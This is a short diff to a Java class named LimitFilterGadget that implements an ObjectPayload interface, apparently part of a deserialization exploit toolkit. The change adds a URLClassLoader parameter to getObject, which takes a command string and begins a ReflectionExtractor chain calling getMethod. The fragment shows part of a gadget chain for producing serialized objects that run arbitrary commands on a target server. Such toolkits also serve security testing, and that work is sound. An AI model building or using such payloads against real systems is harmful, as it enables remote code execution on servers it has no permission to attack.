@@ -33,7 +33,7 @@ public class LimitFilterGadget implements ObjectPayload<Serializable> {
      * @throws Exception
      */
     @Override
-    public Serializable getObject(String command) throws Exception {
+    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
         final String[] execArgs = new String[] { command };
         ValueExtractor[] valueExtractors = new ValueExtractor[]{
                 new ReflectionExtractor("getMethod", new Object[]{
